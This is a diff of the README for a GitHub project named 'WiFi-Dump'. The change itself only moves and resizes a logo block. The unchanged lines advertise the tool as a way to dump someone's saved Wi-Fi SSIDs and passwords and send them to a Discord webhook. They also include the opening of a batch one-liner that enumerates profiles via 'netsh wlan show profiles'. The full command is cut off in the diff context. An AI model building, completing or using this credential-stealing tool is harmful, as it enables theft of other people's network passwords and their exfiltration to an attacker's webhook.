@@ -1,3 +1,12 @@
+<!-- PROJECT LOGO -->
+<br />
+<p align="center">
+  <a href="https://github.com/hackitwithseo/WiFi-Dump/">
+    <img src="./logo.png" alt="Logo" width="120" height="130">
+  </a>
+
+
+
 # WiFi-Dump
 
 ```bash
@@ -6,9 +15,4 @@ for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%
 
 ## Dump someones WiFi SSID and Passwords and send them all to a Discord Webhook
 
-<!-- PROJECT LOGO -->
-<br />
-<p align="center">
-  <a href="https://github.com/hackitwithseo/WiFi-Dump/">
-    <img src="./logo.png" alt="Logo" width="80" height="90">
-  </a>
+
